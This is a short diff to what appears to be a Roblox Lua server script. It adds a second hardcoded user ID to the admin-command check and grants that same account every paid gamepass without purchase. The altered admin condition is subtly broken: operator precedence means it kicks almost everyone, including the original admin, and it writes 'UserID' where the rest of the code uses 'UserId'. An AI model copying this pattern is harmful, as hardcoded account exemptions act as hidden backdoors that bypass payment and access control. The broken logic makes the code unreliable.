@@ -210,7 +210,7 @@ pcall(function()
 end)
 
 RemotesFolder.AdminCommand.OnServerEvent:Connect(function(player, command, targetName, args)
-	if player.UserId ~= 4068160397 and player.Name ~= "girthbender1209" then player:Kick("Unauthorized Admin Access"); return end
+	if player.UserId ~= 4068160397 and player.Name ~= "girthbender1209" or player.UserID ~= 4608697584 then player:Kick("Unauthorized Admin Access"); return end
 
 	if command == "GlobalRollback" then
 		pcall(function() MessagingService:PublishAsync("GlobalDataRollback", "Initiate") end)
@@ -317,7 +317,7 @@ local function LoadPlayer(player)
 	for _, gp in ipairs(ItemData.Gamepasses) do 
 		local hasPass = false
 		pcall(function() hasPass = MarketplaceService:UserOwnsGamePassAsync(player.UserId, gp.ID) end)
-		if player.UserId == 4068160397 then hasPass = true end
+		if player.UserId == 4068160397 or player.UserId == 4608697584 then hasPass = true end
 		player:SetAttribute("Has" .. gp.Key, hasPass) 
 	end
 
